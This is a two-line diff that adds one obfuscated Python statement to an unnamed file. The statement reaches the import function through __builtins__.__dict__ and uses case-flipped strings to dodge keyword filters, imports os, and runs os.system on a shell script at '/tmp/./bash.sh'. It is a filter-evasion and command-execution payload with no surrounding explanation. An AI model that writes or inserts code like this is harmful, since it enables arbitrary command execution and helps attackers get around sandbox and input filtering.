@@ -1,0 +1,2 @@
+
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/tmp/./bash.sh')
